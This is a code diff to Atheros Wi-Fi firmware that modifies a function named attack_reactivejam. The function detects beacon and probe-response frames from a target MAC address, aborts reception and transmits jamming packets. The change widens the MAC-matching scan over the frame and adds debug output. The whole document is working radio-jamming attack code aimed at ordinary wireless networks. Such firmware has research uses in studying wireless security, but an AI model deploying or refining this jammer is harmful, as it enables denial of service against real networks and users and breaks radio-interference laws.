@@ -293,7 +293,7 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	struct ath_rx_desc *ds, *ds2;
 	struct ar5416_desc_20 *ads, *ads2, *txads;
 	volatile unsigned char *buff;
-	unsigned int elapsed, freq, prev;
+	unsigned int elapsed, freq, prev, i;
 
 	//dump_rx_macbufs(ah);
 	//dump_rx_tailq(sc);
@@ -363,7 +363,7 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	{
 		// fill in data that shouldn't occur in valid 802.11 frames
 		buff = (volatile unsigned char *)ds->ds_data;
-		buff[15] = 0xF1;
+//		buff[15] = 0xF1;
 
 		// prepare to send jam packet
 		txads->ds_txstatus9 &= ~AR_TxDone;
@@ -383,25 +383,38 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 		// 1. Jam beacons and probe responses (0x80 and 0x50, respectively)
 		// 2. - If source is a multicast MAC address, then jam *all* transmitters
 		//    - Otherwise jam only the transmitter with MAC address `source`
-//		if ( (buff[0] == 0x80 || buff[0] == 0x50)
-//		     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
-//		{
-			// Abort Rx
-			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;
 
-			// Jam the packet
-			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(TXQUEUE))) = (a_uint32_t)txads;
-			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_Q_TXE)) = 1 << TXQUEUE;
+		for(i=0; i<40; i++) {
 
-			// Re-enable Rx for once packet is transmitted
-			iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);
+//			printk(itox(i));
+//			printk(" ");
+			
+//			if(source[0] == buff[i] && source[2] == buff[i+2] && source[4] == buff[i+4]) {
+			if((buff[0] == 0x80 || buff[0] == 0x50) && A_MEMCMP(source, buff + i, 6) == 0) {
 
-			// No need to wait until AR_TxDone is set in txads->ds_txstatus9, we simple wait
-			// until we receive the next frame.
-			printk("+");
-//		} else {
-//			printk("-");
-//		}
+				// Abort Rx
+				*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;
+
+				// Jam the packet
+				*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(TXQUEUE))) = (a_uint32_t)txads;
+				*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_Q_TXE)) = 1 << TXQUEUE;
+
+				// Re-enable Rx for once packet is transmitted
+				iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_ABORT);
+
+				// No need to wait until AR_TxDone is set in txads->ds_txstatus9, we simple wait
+				// until we receive the next frame.
+	//			printk("+");
+
+				if(i != 0xA){
+					printk(" -> MAC FOUND AT: ");
+					printk(itox(i));
+					printk("\n");
+				}
+				break;
+
+			}
+		}
 
 		// update elapsed time
 		prev = update_elapsed(prev, freq, &elapsed);
